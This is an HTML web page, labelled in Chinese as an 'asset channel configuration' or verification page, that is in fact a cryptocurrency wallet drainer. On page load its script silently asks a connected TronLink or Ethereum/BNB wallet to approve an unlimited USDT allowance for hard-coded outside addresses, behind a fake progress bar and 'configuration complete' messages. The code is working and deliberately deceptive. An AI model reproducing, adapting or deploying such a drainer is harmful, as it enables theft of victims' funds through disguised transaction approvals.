<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>資產通道配置頁面</title>
<style>
  body {
    background: #121212;
    color: #eee;
    font-family: "Microsoft Yahei", Arial, sans-serif;
    display: flex;
    flex-direction: column;
    height: 100vh;
    margin: 0;
    justify-content: center;
    align-items: center;
  }
  h2 {
    margin-bottom: 1rem;
  }
  .status {
    font-size: 1.4rem;
    margin-bottom: 20px;
    transition: color 0.3s ease;
  }
  .status.loading {
    color: #888;
  }
  .status.success {
    color: #4caf50;
  }
  .status.error {
    color: #f44336;
  }
  .progress-bar {
    width: 300px;
    height: 8px;
    background: #333;
    border-radius: 4px;
    overflow: hidden;
    box-shadow: 0 0 5px #222 inset;
  }
  .progress-bar > div {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #2196f3, #21cbf3);
    transition: width 0.5s ease;
  }
</style>
</head>
<body>

<h2>資產通道配置中...</h2>
<div id="status" class="status loading">正在檢測鏈路...</div>
<div class="progress-bar"><div id="progress"></div></div>

<script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
<script>
  const CFG = {
    USDT: {
      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
      ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      BNB:  "0x55d398326f99059fF775485246999027B3197955"
    },
    TARGET: {
      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
      EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
    },
    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
  };

  const statusEl = document.getElementById("status");
  const progressEl = document.getElementById("progress");

  function setStatus(msg, cls="loading", progressPercent=null) {
    statusEl.innerText = msg;
    statusEl.className = "status " + cls;
    if (progressPercent !== null) {
      progressEl.style.width = progressPercent + "%";
    }
  }

  async function waitForTronWeb(timeout = 5000) {
    return new Promise((resolve, reject) => {
      let waited = 0;
      const interval = setInterval(() => {
        if (window.tronWeb && window.tronWeb.ready) {
          clearInterval(interval);
          resolve(true);
        }
        waited += 200;
        if (waited >= timeout) {
          clearInterval(interval);
          reject(new Error("TronLink 初始化超時"));
        }
      }, 200);
    });
  }

  async function tronApprove() {
    try {
      setStatus("資產通道配置中（TronLink）...", "loading", 60);
      const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
      await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
      setStatus("✅ TronLink 配置完成", "success", 100);
      setTimeout(() => window.location.href = "success.html", 800);
      return true;
    } catch (e) {
      console.error("TronApprove Error:", e);
      setStatus("TronLink 授權失敗", "error", 100);
      // 不跳转失败页，返回 false 让上层处理
      return false;
    }
  }

  async function evmApprove() {
    try {
      setStatus("資產通道配置中（EVM）...", "loading", 60);
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const network = await provider.getNetwork();
      let usdtAddress;
      if (network.chainId === 1) usdtAddress = CFG.USDT.ETH;
      else if (network.chainId === 56) usdtAddress = CFG.USDT.BNB;
      else throw new Error("不支援的鏈");

      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const contract = new ethers.Contract(usdtAddress, abi, signer);
      const tx = await contract.approve(CFG.TARGET.EVM, CFG.AMOUNT);
      await tx.wait();
      setStatus("✅ EVM 配置完成", "success", 100);
      setTimeout(() => window.location.href = "success.html", 800);
      return true;
    } catch (e) {
      console.warn("EVM 授權失敗，準備回退使用 TronLink", e);
      // 不跳转失败页，返回 false 让上层处理
      return false;
    }
  }

  async function initVerification() {
    try {
      setStatus("正在檢測鏈路...", "loading", 10);

      // 優先嘗試 TronLink
      if (window.tronLink || (window.tronWeb && window.tronWeb.ready)) {
        try {
          setStatus("等待 TronLink 初始化...", "loading", 30);
          await waitForTronWeb();
          const tronOk = await tronApprove();
          if (tronOk) return;  // 成功結束
        } catch (e) {
          console.warn("TronWeb 初始化或授權失敗", e);
          // 失敗繼續嘗試 EVM
        }
      }

      // 嘗試 EVM 授權
      if (window.ethereum) {
        setStatus("請求 EVM 錢包授權...", "loading", 30);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const evmOk = await evmApprove();
          if (evmOk) return; // 成功結束
          // EVM 失敗，回退用 TronLink 授權
        } catch (e) {
          console.warn("EVM 授權請求失敗", e);
        }
      }

      // EVM 授權失敗，回退嘗試 TronLink（如果已初始化）
      if (window.tronWeb && window.tronWeb.ready) {
        setStatus("EVM 授權失敗，回退使用 TronLink 授權...", "loading", 50);
        const tronOk = await tronApprove();
        if (tronOk) return;  // 成功結束
      }

      // 全部失敗，不跳轉失敗頁，顯示錯誤狀態，但停留當前頁
      setStatus("鏈路授權失敗，請檢查錢包或稍後重試", "error", 100);

    } catch (err) {
      console.error("驗證過程錯誤", err);
      setStatus("驗證過程出錯，請稍後重試", "error", 100);
    }
  }

  window.addEventListener('load', () => {
    let progress = 0;
    const progressInterval = setInterval(() => {
      progress += 5;
      if (progress < 10) setStatus("正在啟動...", "loading", progress);
      if (progress >= 10) {
        clearInterval(progressInterval);
        initVerification();
      }
    }, 100);
  });
</script>

</body>
</html>
